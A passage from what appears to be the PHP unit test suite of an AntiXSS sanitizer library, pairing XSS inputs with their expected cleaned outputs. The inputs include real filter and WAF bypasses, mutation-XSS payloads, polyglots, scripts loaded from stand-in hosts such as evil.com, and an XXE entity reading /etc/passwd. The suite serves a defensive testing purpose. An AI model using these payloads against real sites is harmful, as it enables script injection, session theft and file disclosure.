            '<div data-toggle=tooltip data-html=true title=\'<script>alert(1)</script>\'></div>'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           => '<div data-toggle=tooltip data-html=true title=\'\'></div>', // Bypassing CSP strict-dynamic via Bootstrap
            '<div data-role=popup id=\'--><script>alert(1)</script>\'></div>'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              => '<div data-role=popup id=\'-->\'></div>', // Bypassing sanitizers via jQuery Mobile
            '<div data-bind="html:\'<script src=&quot;//evil.com&quot;></script>\'"></div>'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                => '<div data-bind="html:\'\'"></div>', // Bypassing sanitizers via Knockout
            "\n><!-\n<b\n<c d=\"'e><iframe onload=alert(1) src=x>\n<a HREF=\"\">\n"                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        => "\n>&lt;!-\n&lt;b\n&lt;c d=\"'e&gt;&lt;iframe  src=x&gt;\n&lt;a \"\"&gt;\n", // CodeIgniter 2017-01 - https://github.com/bcit-ci/CodeIgniter/commit/2ab1c1902711c8b0caf5c3e8f2fa825d72f6755d
            '<x/><title>&amp;lt;/title&amp;gt;&amp;lt;img src=1 onerror=alert(1)&amp;gt;'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  => '<x/>&lt;title&gt;&lt;/title&gt;<img >', // "Bypassing DOMPurify with mXSS" - http://www.thespanner.co.uk/2018/07/29/bypassing-dompurify-with-mxss/
            // Filter Bypass - Tricks (http://brutelogic.com.br/docs/advanced-xss.pdf)
            //
            // Spacers
            '<x%09onxxx=1' => '&lt;x	onxxx=1',
            '<x%0Aonxxx=1' => '&lt;x' . "\nonxxx=1",
            '<x%0Conxxx=1' => '&lt;xonxxx=1',
            '<x%0Donxxx=1' => '&lt;x' . "\nonxxx=1",
            '<x%2Fonxxx=1' => '&lt;x/onxxx=1',

            '<img alt=\'Right click and share me!\' src=% />' => '<img alt=\'Right click and share me!\' />',

            '<IMG SRC="jav&#x0D;ascript:alert(\'XSS\');">'    => '<IMG SRC="(\'XSS\');">',
            '<IMG SRC="j a v a s c r i p t:alert(\'XSS\');">' => '<IMG SRC="(\'XSS\');">',
            '<IMG SRC="j a v a ｓ c ｒ ｉ ｐ t:alert(\'XSS\');">' => '<IMG src="">',
            // Quotes
            '<x 1=\'1\'onxxx=1' => '&lt;x 1=\'1\'onxxx=1',
            '<x 1="1"onxxx=1'   => '&lt;x 1="1"onxxx=1',
            // Mimetism
            '<x </onxxx=hack (closing tag)' => '&lt;x &lt;/onxxx=hack (closing tag)',
            '<http://onxxx%3Dhack/ (URL)'   => '&lt;http://onxxx=hack/ (URL)',
            '<x </onxxx=1 (closing tag)'    => '&lt;x &lt;/onxxx=1 (closing tag)',
            '<http://onxxx%3D1/ (URL)'      => '&lt;http://onxxx=1/ (URL)',
            // Combo
            '<x%2F1=">%22OnClick%3D1' => '<x/1=">"=1',
            // Location Based Payloads
            //
            // Location
            '<svg onload=location=/javas/.source+/cript:/.source+/ale/.source+/rt/.
source+location.hash[1]+1+location.hash[2]>#()' => '&lt;svg 
source+location.hash[1]+1+location.hash[2]&gt;#()',
            '<svg id=t:alert(1) name=javascrip onload=location=name+id>' => '&lt;svg id=t:alert&#40;1&#41; name=javascrip &gt;',
            '<javascript onclick=location=tagName+innerHTML+location.hash>:/*click me!
#*/alert(1)' => '<javascript >:/*click me!
#*/alert&#40;1&#41;', // javas + cript:"click me! + #"-alert(1)
            '*/"<j"-alert(9)<!-- onclick=location=innerHTML+previousSibling.
nodeValue+outerHTML>javascript:/*click me' => '*/"<j"-alert&#40;9&#41;&lt;!-- 
nodeValue+outerHTML>/*click me',
            '<alert(1)<!-- onclick=location=innerHTML+outerHTML>javascript:1/*click me!
*/</alert(1)<!-- -->' => '<alert&#40;1&#41;&lt;!-- >/*click me!
*/&lt;/alert&#40;1&#41;&lt;!-- --&gt;',
            '<javas onclick=location=tagName+innerHTML+URL>cript:"-\'click me!</javas>#\'-
alert(1)' => '<javas >cript:"-\'click me!</javas>#\'-
alert&#40;1&#41;',
            // Location Self
            'p=<j onclick=location=textContent>?p=%26lt;svg/onload=alert(1)>' => 'p=<j >?p=&lt;svg/&gt;',
            'p=<svg id=?p=<svg/onload=alert(1)%2B onload=location=id>'        => 'p=&lt;svg id=?p=&lt;svg/ &gt;',
            // Location Self Plus
            'p=%26p=%26lt;svg/onload=alert(1)><j onclick=location%2B=document.body.
textContent>click me!' => 'p=%26p=%26lt;svg/=alert&#40;1&#41;><j 
textContent>click me!',
            'p=<j onclick=location%2B=textContent>%26p=%26lt;svg/onload=alert(1)>'                                                             => 'p=<j >&p=&lt;svg/&gt;',
            '<object data=javascript:confirm()><a href=javascript:confirm()>click here<script src=//14.rs></script><script>confirm()</script>' => '&lt;object data=()&gt;<a >click here', // Without event handlers
            '<svg/onload=confirm()><iframe/src=javascript:alert(1)>'                                                                           => '&lt;svg/&gt;&lt;iframe/src=(1)&gt;', // Without space (https://github.com/s0md3v/AwesomeXSS)
            '<svg onload=confirm()><img src=x onerror=confirm()>'                                                                              => '&lt;svg &gt;<img >', // Without slash (/)
            '<script>confirm()</script>'                                                                                                       => '', // Without equal sign (=)
            '<svg onload=confirm()//'                                                                                                          => '&lt;svg ', // Without closing angular bracket (>)
            '<script src=//14.rs></script><svg onload=co\u006efirm()><svg onload=z=co\u006efir\u006d,z()>'                                     => '&lt;svg &gt;&lt;svg &gt;', // Without alert, confirm, prompt
            '<x onclick=confirm()>click here <x ondrag=aconfirm()>drag it'                                                                     => '<x >click here <x >drag it', // Without a Valid HTML tag
            '<svg></p><style><a id="</style><img src=1 onerror=alert(1)>">'                                                                    => '&lt;svg&gt;</p>&lt;style&gt;<a >">', // DOMPurify 2.0.0 bypass using mutation XSS (2019) (https://research.securitum.com/dompurify-bypass-using-mxss/)
            '<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x>'                                                                                 => "<dETAILS\nopen\n x>", // Akamai GHost XSS bypass (2018) (https://twitter.com/s0md3v/status/1056447131362324480)

            '<iframe srcdoc=\'&lt;meta http-equiv="refresh" content="5;url=(link: https://www.google.com/) google.com " /&gt;&lt;script&gt;alert(document.domain + "\n\n" + document.cookie);</script>\'/>' => '&lt;iframe srcdoc=\'&lt;meta http-equiv="refresh" content="5;url=(link: https://www.google.com/) google.com " /&gt;\'/>', // MS Edge Iframe srcdoc UXSS POC (2018) (https://mobile.twitter.com/Windowsrcer/status/1071131620856320000?s=19)

            '%0ajavascript:`/*\"/*-->&lt;svg onload=\'/*</template></noembed></noscript></style></title></textarea></script><html onmouseover="/**/ alert()//\'">`' => "\n" . "/*\\\"/*-->&lt;svg ='/*</template></noembed>&lt;/noscript&gt;&lt;/style&gt;&lt;/title&gt;&lt;/textarea&gt;&lt;html &gt;`", // Awesome Polyglots (https://github.com/s0md3v/AwesomeXSS)
            '
            Wordfence 7.4.2<a href=&#01javascript:alert(1)>
            Sucuri CloudProxy (POST only)<a href=javascript&colon;confirm(1)>
            ModSecurity CRS 3.2.0 PL1<a href="jav%0Dascript&colon;alert(1)">
            ' => '
            Wordfence 7.4.2<a >
            Sucuri CloudProxy (POST only)<a >
            ModSecurity CRS 3.2.0 PL1<a href="(1)">
            ', // 2019-12 - https://twitter.com/brutelogic/status/1209086328383660033
            'https://terjanq.me/xss.php?js=onhashchange=setTimeout;Object.prototype.toString=RegExp.prototype.toString;Object.prototype.source=location.hash;location.hash=null;#null' => 'https://terjanq.me/xss.php?js==setTimeout;Object.prototype.toString=RegExp.prototype.toString;Object.prototype.source=location.hash;location.hash=null;#null', // XSS without parenthesses | https://twitter.com/terjanq/status/1286059146509516800 (2020)
        ];

        $antiXss = new AntiXSS();
        foreach ($testArray as $before => $after) {
            static::assertSame($after, $antiXss->xss_clean($before), 'testing: ' . $before);
            static::assertTrue($antiXss->isXssFound(), 'testing: ' . $before);
        }

        // test for php < OR > 5.3

        $testArray = [
            '<DIV STYLE="background-image: url(&#1;javascript:alert(\'XSS\'))">'                                                      => '<DIV >',
            'If you like entities... <a href="javascript&colon;&apos;<script src=/&sol;&ETH;.pw&nvgt;</script&nvgt;&apos;">CLICK</a>' => 'If you like entities... <a href="\'⃒⃒\'">CLICK</a>', // https://twitter.com/0x6D6172696F/status/629754114084175872
            '<iframe srcdoc="<svg onload=alert(1)&nvgt;"></iframe>'                                                                   => '&lt;iframe srcdoc="&lt;svg &gt;⃒">&lt;/iframe&gt;',
            '<a href="javascript:&apos;<svg onload&equals;alert&lpar;1&rpar;&nvgt;&apos;">CLICK</a>'                                  => '<a href="">CLICK</a>',
        ];

        for ($i = 0; $i < 2; ++$i) { // keep this loop, for quick performance tests
            foreach ($testArray as $before => $after) {
                static::assertSame($after, (new AntiXSS())->xss_clean($before), 'testing: ' . $before);
            }
        }
    }

    /**
     * https://github.com/s0md3v/AwesomeXSS
     */
    public function testAwesomePayload()
    {
        /** @noinspection JSUndeclaredVariable */
        $testString = "<A/hREf=\"j%0aavas%09cript%0a:%09con%0afirm%0d``\">z
        <d3\"<\"/onclick=\"1>[confirm``]\"<\">z
        <d3/onmouseenter=[2].find(confirm)>z
        <details open ontoggle=confirm()>
        <script y=\"><\">/*<script* */prompt()</script
        <w=\"/x=\"y>\"/ondblclick=`<`[confir\u006d``]>z
        <a href=\"javascript%26colon;alert(1)\">click
        <a href=javas&#99;ript:alert(1)>click
        <script/\"<a\"/src=data:=\".<a,[8].some(confirm)>
        <svg/x=\">\"/onload=confirm()//
        <--`<img/src=` onerror=confirm``> --!>
        <svg%0Aonload=%09((pro\u006dpt))()//
        <sCript x>(((confirm)))``</scRipt x>
        <svg </onload =\"1> (_=prompt,_(1)) \"\">
        <!--><script src=//14.rs>
        <embed src=//14.rs>
        <script x=\">\" src=//15.rs></script>
        <!'/*\"/*/'/*/\"/*--></Script><Image SrcSet=K */; OnError=confirm`1` //>
        <iframe/src \/\/onload = prompt(1)
        <x oncut=alert()>x
        <svg onload=write()>";

        $expected = '<A/hREf="">z
        <d3"&lt;"/&lt;">z
        <d3/>z
        <details open >
        &lt;"&gt;/*"/=`&lt;`[confir\u006d``]&gt;z
        &lt;a href="(1)"&gt;click
        &lt;a &gt;click
        
        &lt;svg/x="&gt;"/=confirm&#40;&#41;//
        &lt;--`&lt;img/&gt; --!&gt;
        &lt;&gt;
        &lt;&gt; (_=prompt,_(1)) ""&gt;
        &lt;!--&gt;
        &lt;embed src=//14.rs&gt;
        " src=//15.rs&gt;
        &lt;Image SrcSet=K */;  //&gt;
        &lt;iframe/src \/\/
        &lt;x &gt;x
        &lt;svg &gt;';

        static::assertSame($expected, (new AntiXSS())->xss_clean($testString));
    }

    public function testStringReplaceViaRegEx()
    {
        $testString = "<IMG SRC=\"jav&#x09;ascript:alert&rpar;'XSS'&rpar;;\">";

        static::assertSame('<IMG SRC=")\'XSS\');">', (new AntiXSS())->xss_clean($testString));
    }

    public function testRemoveEvilAttributes()
    {
        // init
        $antiXss = new AntiXSS();

        $testArray = [
            '<IMG SRC=\'vbscript:msgbox("XSS")\'>'                                           => '<IMG SRC=\'vbscript:msgbox("XSS")\'>',
            '<form onsubmit=\'alert(1)\'><input onfocus=alert(2) name=attributes>123</form>' => '<form ><input  name=attributes>123</form>',
            '<Video> <source onerror = "javascript: alert (XSS)">'                           => '<Video> <source >',
        ];

        foreach ($testArray as $test => $expected) {
            static::assertSame($expected, $this->invokeMethod($antiXss, '_remove_evil_attributes', [$test]));
        }

        // ---

        $testString = '<li FSCommand="bar" style="list-style-image: url(javascript:alert(0))">';

        static::assertSame('<li  >', $antiXss->xss_clean($testString));

        // ---

        $antiXss->removeEvilAttributes(['style', 'FSCommand']);

        static::assertSame('<li FSCommand="bar" style="list-style-image: url((0))">', $antiXss->xss_clean($testString));

        // ---

        // reset
        $antiXss->addEvilAttributes(['style', 'FSCommand']);

        static::assertSame('<li  >', $antiXss->xss_clean($testString));
    }

    public function testHtmlNoXssFile()
    {
        $testString = UTF8::file_get_contents(__DIR__ . '/fixtures/xss_no_v1.html');
        $resultString = UTF8::file_get_contents(__DIR__ . '/fixtures/xss_no_v1_clean.html');

        static::assertSame(
            \str_replace(["\r\n", "\r"], "\n", $resultString),
            \str_replace(["\r\n", "\r"], "\n", (new AntiXSS())->xss_clean($testString)),
            'testing: ' . $testString
        );
    }

    public function testHtmlXssFile()
    {
        $testString = UTF8::file_get_contents(__DIR__ . '/fixtures/xss_v1.html');
        $resultString = UTF8::file_get_contents(__DIR__ . '/fixtures/xss_v1_clean.html');

        static::assertSame(
            \str_replace(["\r\n", "\r"], "\n", \trim($resultString)),
            \str_replace(["\r\n", "\r"], "\n", (new AntiXSS())->xss_clean(\trim($testString))),
            'testing: ' . $testString
        );
    }

    public function testIssue58()
    {
        $testString = '<AWACS>
    <HEADER>
        <SERVICE_ID>BLAH1</SERVICE_ID>
        <DATASOURCE>BLAH2</DATASOURCE>
        <KEY>BLAH3</KEY>
    </HEADER>
    <DATA>
        <REQUEST>
            <FUNCTION NAME="function">
                <PARAM NAME="select">
                    <RELATIES>
                        <RELATIE>
                            <PK />
                            <L NR="55" />
                        </RELATIE>
                        <WHERE TOP="55"/>
                    </RELATIES>
                </PARAM>
            </FUNCTION>
        </REQUEST>
    </DATA>
</AWACS>';

        $antiXSS = new AntiXSS();
        static::assertSame($testString, $antiXSS->xss_clean($testString));
    }

    public function testHtmlXssFileIssue41()
    {
        $testString = UTF8::file_get_contents(__DIR__ . '/fixtures/xss_issue_sample_post_small.html');
        $resultString = UTF8::file_get_contents(__DIR__ . '/fixtures/xss_issue_sample_post_small.html');

        static::assertSame(
            \str_replace(["\r\n", "\r"], "\n", \trim($resultString)),
            \str_replace(["\r\n", "\r"], "\n", \html_entity_decode((new AntiXSS())->xss_clean(\trim($testString)))),
            'testing: ' . $testString
        );
    }

    public function testSvgXssFileV1()
    {
        $testString = UTF8::file_get_contents(__DIR__ . '/fixtures/xss_v1.svg');
        $resultString = UTF8::file_get_contents(__DIR__ . '/fixtures/xss_v1_clean.svg');

        static::assertSame(
            \str_replace(["\n\r", "\r\n", "\n"], "\n", $resultString),
            \str_replace(["\n\r", "\r\n", "\n"], "\n", (new AntiXSS())->xss_clean($testString)),
            'testing: ' . $testString
        );
    }

    public function testAwesomeXssCollection()
    {
        $testString = '
        <details open ontoggle=confirm()>
        <script y="><">/*<script* */prompt()</script
        <w="/x="y>"/ondblclick=`<`[confir\u006d``]>z
        <a href="javascript%26colon;alert(1)">click
        <script/"<a"/src=data:=".<a,[8].some(confirm)>
        <svg/x=">"/onload=confirm()//
        <--`<img/src=` onerror=confirm``> --!>
        <svg%0Aonload=%09((pro\u006dpt))()//
        <sCript x>(((confirm)))``</scRipt x>
        <svg </onload ="1> (_=prompt,_(1)) "">
        <!--><script src=//14.rs>
        <embed src=//14.rs>
        <script x=">" src=//15.rs></script>
        <!\'/*"/*/\'/*/"/*--></Script><Image SrcSet=K */; OnError=confirm`1` //>
        <iframe/src \/\/onload = prompt(1)
        <x oncut=alert()>x
        <svg onload=write()>
        ';

        $resultStringOrig = '
        <details open >
        &lt;"&gt;/*"/=`&lt;`[confir\u006d``]&gt;z
        &lt;a href="(1)"&gt;click
        
        &lt;svg/x="&gt;"/=confirm&#40;&#41;//
        &lt;--`&lt;img/&gt; --!&gt;
        &lt;&gt;
        &lt;&gt; (_=prompt,_(1)) ""&gt;
        &lt;!--&gt;
        &lt;embed src=//14.rs&gt;
        " src=//15.rs&gt;
        &lt;Image SrcSet=K */;  //&gt;
        &lt;iframe/src \/\/
        &lt;x &gt;x
        &lt;svg &gt;
        ';

        static::assertSame(
            $resultStringOrig,
            (new AntiXSS())->xss_clean($testString),
            'testing: ' . $testString
        );

        static::assertSame(
            [
                0  => '',
                1  => '        <details open >',
                2  => '        &lt;"&gt;/*',
                3  => '        <w="/x="y>"/=`&lt;`[confir\u006d``]&gt;z',
                4  => '        <a href="(1)">click',
                5  => '        ',
                6  => '        &lt;svg/x="&gt;"/=confirm&#40;&#41;//',
                7  => '        &lt;--`&lt;img/&gt; --!&gt;',
                8  => "        &lt;svg\n",
                9  => '        (((confirm)))``x>',
                10 => '        &lt;svg &lt;/"&gt;',
                11 => '        &lt;!-->',
                12 => '        &lt;embed src=//14.rs&gt;',
                13 => '        " src=//15.rs>',
                14 => '        <Image SrcSet=K */;  //>',
                15 => '        &lt;iframe/src \/\/',
                16 => '        <x >x',
                17 => '        &lt;svg &gt;',
                18 => '        ',
            ],
            (new AntiXSS())->xss_clean(\explode("\n", $testString)),
            'testing: ' . $testString
        );
    }

    public function testSpecialString()
    {
        $str = '*/"<j"-alert(9)<!-- onclick=location=innerHTML+previousSibling.
nodeValue+outerHTML>javascript:/*click me';

        $str = (new AntiXSS())->xss_clean($str);

        static::assertSame('*/"<j"-alert&#40;9&#41;&lt;!-- 
nodeValue+outerHTML>/*click me', $str);
    }

    public function testAllowIframe()
    {
        // init
        $antiXss = new AntiXSS();

        $testString = '
    <video autoplay="autoplay" controls="controls" width="640" height="360"> <source src="http://clips.vorwaerts-gmbh.de/VfE_html5.mp4" type="video/mp4" /> <source src="http://clips.vorwaerts-gmbh.de/VfE.webm" type="video/webm" /> <source src="http://clips.vorwaerts-gmbh.de/VfE.ogv" type="video/ogg" /> <img title="No video playback capabilities, please download the video below" src="/poster.jpg" alt="Big Buck Bunny" width="640" height="360"> </video>
<p><strong>Download Video:</strong> Closed Format: <a href="http://clips.vorwaerts-gmbh.de/big_buck_bunny.mp4">"MP4"</a> Open Format: <a href="http://clips.vorwaerts-gmbh.de/big_buck_bunny.ogv">"OGG"</a> / <a href="http://clips.vorwaerts-gmbh.de/big_buck_bunny.webm">"WebM"</a></p>

<iframe width="560" height="315" src="https://www.youtube.com/embed/YE7VzlLtp-4?rel=0&amp;controls=0&amp;showinfo=0" frameborder="0" allowfullscreen></iframe>
    ';

        $resultStringOrig = '
    &lt;video autoplay="autoplay" controls="controls" width="640" height="360"&gt; &lt;source src="http://clips.vorwaerts-gmbh.de/VfE_html5.mp4" type="video/mp4" /&gt; &lt;source src="http://clips.vorwaerts-gmbh.de/VfE.webm" type="video/webm" /&gt; &lt;source src="http://clips.vorwaerts-gmbh.de/VfE.ogv" type="video/ogg" /&gt; <img title="No video playback capabilities, please download the video below" src="/poster.jpg" alt="Big Buck Bunny" width="640" height="360"> &lt;/video&gt;
<p><strong>Download Video:</strong> Closed Format: <a href="http://clips.vorwaerts-gmbh.de/big_buck_bunny.mp4">"MP4"</a> Open Format: <a href="http://clips.vorwaerts-gmbh.de/big_buck_bunny.ogv">"OGG"</a> / <a href="http://clips.vorwaerts-gmbh.de/big_buck_bunny.webm">"WebM"</a></p>

&lt;iframe width="560" height="315" src="https://www.youtube.com/embed/YE7VzlLtp-4?rel=0&amp;controls=0&amp;showinfo=0" frameborder="0" allowfullscreen&gt;&lt;/iframe&gt;
    ';

        static::assertSame(
            $resultStringOrig,
            $antiXss->xss_clean($testString),
            'testing: ' . $testString
        );

        $antiXss->removeEvilHtmlTags(['video', 'source', 'iframe']);

        $resultString = '
    <video autoplay="autoplay" controls="controls" width="640" height="360"> <source src="http://clips.vorwaerts-gmbh.de/VfE_html5.mp4" type="video/mp4" /> <source src="http://clips.vorwaerts-gmbh.de/VfE.webm" type="video/webm" /> <source src="http://clips.vorwaerts-gmbh.de/VfE.ogv" type="video/ogg" /> <img title="No video playback capabilities, please download the video below" src="/poster.jpg" alt="Big Buck Bunny" width="640" height="360"> </video>
<p><strong>Download Video:</strong> Closed Format: <a href="http://clips.vorwaerts-gmbh.de/big_buck_bunny.mp4">"MP4"</a> Open Format: <a href="http://clips.vorwaerts-gmbh.de/big_buck_bunny.ogv">"OGG"</a> / <a href="http://clips.vorwaerts-gmbh.de/big_buck_bunny.webm">"WebM"</a></p>

<iframe width="560" height="315" src="https://www.youtube.com/embed/YE7VzlLtp-4?rel=0&amp;controls=0&amp;showinfo=0" frameborder="0" allowfullscreen></iframe>
    ';

        static::assertSame(
            $resultString,
            $antiXss->xss_clean($testString),
            'testing: ' . $testString
        );

        static::assertSame(
            '<iframe width="560"  height="315" src="https://www.youtube.com/embed/foobar?rel=0&controls=0&showinfo=0" frameborder="0" allowfullscreen></iframe>',
            $antiXss->xss_clean('<iframe width="560" onclick="alert(\'xss\')" height="315" src="https://www.youtube.com/embed/foobar?rel=0&controls=0&showinfo=0" frameborder="0" allowfullscreen></iframe>')
        );

        // ---

        // reset
        $antiXss->addEvilHtmlTags(['video', 'source', 'iframe']);

        static::assertSame(
            $resultStringOrig,
            $antiXss->xss_clean($testString),
            'testing: ' . $testString
        );
    }

    public function testSvgXssFileV2()
    {
        // PDF-based polyglots through SVG images
        //
        // http://blog.mindedsecurity.com/2015/08/pdf-based-polyglots-through-svg-images.html

        $testString = UTF8::file_get_contents(__DIR__ . '/fixtures/xss_v2.svg');
        $testString = \str_replace(["\n\r", "\r\n", "\n"], "\n", $testString);
        $resultString = UTF8::file_get_contents(__DIR__ . '/fixtures/xss_v2_clean.svg');
        $resultString = \str_replace(["\n\r", "\r\n", "\n"], "\n", $resultString);

        static::assertSame(
            $resultString,
            \html_entity_decode((new AntiXSS())->xss_clean($testString)),
            'testing: ' . $testString
        );
    }

    public function testSvgXssFileV3()
    {
        $testString = UTF8::file_get_contents(__DIR__ . '/fixtures/xss_v3.svg');
        $testString = \str_replace(["\n\r", "\r\n", "\n"], "\n", $testString);
        $resultString = UTF8::file_get_contents(__DIR__ . '/fixtures/xss_v3_clean.svg');
        $resultString = \str_replace(["\n\r", "\r\n", "\n"], "\n", $resultString);

        static::assertSame(
            $resultString,
            \html_entity_decode((new AntiXSS())->xss_clean($testString)),
            'testing: ' . $testString
        );
    }

    public function testXssFileV3()
    {
        $testString = UTF8::file_get_contents(__DIR__ . '/fixtures/xss_v3.html');
        $testString = \str_replace(["\n\r", "\r\n", "\n"], "\n", $testString);
        $resultString = UTF8::file_get_contents(__DIR__ . '/fixtures/xss_v3_clean.html');
        $resultString = \str_replace(["\n\r", "\r\n", "\n"], "\n", $resultString);

        static::assertSame(
            $resultString,
            \str_replace(["\n\r", "\r\n", "\n"], "\n", (new AntiXSS())->xss_clean($testString)),
            'testing: ' . $testString
        );
    }

    public function testXssFileV4()
    {
        $testString = UTF8::file_get_contents(__DIR__ . '/fixtures/xss_v4.html');
        $testString = \str_replace(["\n\r", "\r\n", "\n"], "\n", $testString);
        $resultString = UTF8::file_get_contents(__DIR__ . '/fixtures/xss_v4_clean.html');
        $resultString = \str_replace(["\n\r", "\r\n", "\n"], "\n", $resultString);

        static::assertSame(
            $resultString,
            \str_replace(["\n\r", "\r\n", "\n"], "\n", (new AntiXSS())->xss_clean($testString)),
            'testing: ' . $testString
        );
    }

    public function testNonXssFile()
    {
        $testString = UTF8::file_get_contents(__DIR__ . '/fixtures/base64_image.html');
        $testString = \str_replace(["\n\r", "\r\n", "\n"], "\n", $testString);
        $resultString = UTF8::file_get_contents(__DIR__ . '/fixtures/base64_image.html');
        $resultString = \str_replace(["\n\r", "\r\n", "\n"], "\n", $resultString);

        static::assertSame(
            $resultString,
            \str_replace(["\n\r", "\r\n", "\n"], "\n", (new AntiXSS())->xss_clean($testString)),
            'testing: ' . $testString
        );
    }

    public function testPerformanceIssue()
    {
        $testString = UTF8::file_get_contents(__DIR__ . '/fixtures/image.html');
        $testString = \str_replace(["\n\r", "\r\n", "\n"], "\n", $testString);
        $resultString = UTF8::file_get_contents(__DIR__ . '/fixtures/image_clean.html');
        $resultString = \str_replace(["\n\r", "\r\n", "\n"], "\n", $resultString);

        static::assertSame(
            $resultString,
            \str_replace(["\n\r", "\r\n", "\n"], "\n", (new AntiXSS())->xss_clean($testString)),
            'testing: ' . $testString
        );
    }

    public function testUrls()
    {
        $testArray = [
            "<a href=\"https://sellercentral.amazon.com/gp/change-password/change-password-em ail.html?errorMessage=I'm%20sorry,%20the%20Password%20Assistance%20pag e%20is%20temporarily%20unavailable.%20%20Please%20try%20again%20in%201 5%2\">test</a>" => "<a href=\"https://sellercentral.amazon.com/gp/change-password/change-password-em ail.html?errorMessage=I'm%20sorry,%20the%20Password%20Assistance%20pag e%20is%20temporarily%20unavailable.%20%20Please%20try%20again%20in%201 5%2\">test</a>",
            "https://sellercentral.amazon.com/gp/change-password/change-password-em ail.html?errorMessage=I'm%20sorry,%20the%20Password%20Assistance%20pag e%20is%20temporarily%20unavailable.%20%20Please%20try%20again%20in%201 5%2"                      => "https://sellercentral.amazon.com/gp/change-password/change-password-em ail.html?errorMessage=I'm%20sorry,%20the%20Password%20Assistance%20pag e%20is%20temporarily%20unavailable.%20%20Please%20try%20again%20in%201 5%2",
            'http://www.amazon.com/script-alert-product-document-cookie/dp/B003H777 5E/ref=sr_1_3?s=gateway&amp;ie=UTF8&amp;qid=1285870078&amp;sr=8-3'                                                                                                      => 'http://www.amazon.com/script-alert-product-document-cookie/dp/B003H777 5E/ref=sr_1_3?s=gateway&amp;ie=UTF8&amp;qid=1285870078&amp;sr=8-3',
            'https://acme.com/i-ker/kiado+lakas/tegla-epitesu-lakas/budapest+1+kerulet+batthyany+ter/123454'                                                                                                                                                => 'https://acme.com/i-ker/kiado+lakas/tegla-epitesu-lakas/budapest+1+kerulet+batthyany+ter/123454',
        ];

        foreach ($testArray as $before => $after) {
            static::assertSame($after, (new AntiXSS())->xss_clean($before), 'testing: ' . $before);
        }
    }

    public function testXmlInjection()
    {
        // XXE injection | http://phpsecurity.readthedocs.org/en/latest/Injection-Attacks.html#xml-injection

        $testArray = [
            '<!DOCTYPE foo [<!ENTITY xxe7eb97 SYSTEM "file:///etc/passwd"> ]>' => '&lt;!DOCTYPE foo [&lt;!ENTITY xxe7eb97 SYSTEM "file:///etc/passwd"> ]>',
        ];

        foreach ($testArray as $before => $after) {
            static::assertSame($after, (new AntiXSS())->xss_clean($before), 'testing: ' . $before);
        }
    }

    public function testScriptEncoding()
    {
        // https://www.owasp.org/index.php/Testing_for_Cross_site_scripting#Black_Box_testing_and_example

        $testArray = [
            '<script src=http://www.example.com/malicious-code.js></script>'                             => '',
            '%3cscript src=http://www.example.com/malicious-code.js%3e%3c/script%3e'                     => '',
            "\x3cscript src=http://www.example.com/malicious-code.js\x3e\x3c/script\x3e"                 => '',
            "'`\"><\x3Cscript>javascript:alert(1)</script>'`\"><\x00script>javascript:alert(1)</script>" => '\'`">&lt;\'`"&gt;',
        ];

        foreach ($testArray as $before => $after) {
            static::assertSame($after, (new AntiXSS())->xss_clean($before), 'testing: ' . $before);
        }
    }

    public function testOnError()
    {
        $testArray = [
            '<img src=1 href=1 onerror="javascript:alert(1)"></img>'                              => '<img  ></img>',
            '<audio src=1 href=1 onerror="javascript:alert(1)"></audio>'                          => '&lt;audio  &gt;&lt;/audio&gt;',
            '<video src=1 href=1 onerror="javascript:alert(1)"></video>'                          => '&lt;video  &gt;&lt;/video&gt;',
            '<body src=1 href=1 onerror="javascript:alert(1)"></body>'                            => '&lt;body src=1 href=1 &gt;&lt;/body&gt;',
            '<image src=1 href=1 onerror="javascript:alert(1)"></image>'                          => '<image src=1 href=1 ></image>',
            '<object src=1 href=1 onerror="javascript:alert(1)"></object>'                        => '&lt;object src=1 href=1 &gt;&lt;/object&gt;',
            '<script src=1 href=1 onerror="javascript:alert(1)"></script>'                        => '',
            '< /  script src=1 href=1 onerror="javascript:alert(1)"></script>'                    => 'src=1 href=1 ="(1)">',
            '<svg onResize svg onResize="javascript:javascript:alert(1)"></svg onResize>'         => '&lt;svg onResize svg &gt;&lt;/svg onResize&gt;',
            '<svg onResize=alert() svg onResize="javascript:javascript:alert(1)"></svg onResize>' => '&lt;svg  svg &gt;&lt;/svg onResize&gt;',
        ];

        foreach ($testArray as $before => $after) {
            static::assertSame($after, (new AntiXSS())->xss_clean($before), 'testing: ' . $before);
        }
    }

    public function testSvgXss()
    {
        $testArray = [
            '<?xml version="1.0" standalone="no"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg"><polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/><script type="text/javascript">alert(\'This app is probably vulnerable to XSS attacks!\');</script></svg>'                                                                                                                                                                                 => '&lt;?xml version="1.0" standalone="no"?&gt;&lt;!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">&lt;svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg"&gt;<polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>alert&#40;\'This app is probably vulnerable to XSS attacks!\'&#41;;&lt;/svg&gt;',
